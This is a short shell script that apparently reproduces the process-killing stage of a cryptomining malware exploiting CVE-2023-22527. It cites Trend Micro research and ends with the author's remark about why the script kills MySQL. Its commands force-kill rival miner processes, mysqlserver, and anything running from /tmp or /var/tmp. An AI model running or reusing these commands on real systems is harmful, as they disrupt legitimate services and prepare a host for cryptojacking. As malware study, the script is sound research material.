#!/bin/sh

# https://www.trendmicro.com/en_us/research/24/h/cve-2023-22527-cryptomining.html


export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin

ps aux | grep -v grep | grep 'givemezxy' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'dbuse' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'kdevtmpfsi' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'javaupDates' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'kinsing' | awk '{print $2}' | xargs -I % kill -9 %

killall /tmp/*
killall /tmp/.*
killall /var/tmp/*
killall /var/tmp/.*

pgrep JavaUpdate | xargs -I % kill -9 %
pgrep kinsing | xargs -I % kill -9 %
pgrep donate | xargs -I % kill -9 %
pgrep kdevtmpfsi | xargs -I % kill -9 %
pgrep sysupdate | xargs -I % kill -9 %
pgrep mysqlserver | xargs -I % kill -9 %
# Sidenote, idk why tf they're killing mysqlserver stuff - but I'm assuming it's b/c they think it could be a competitor miner
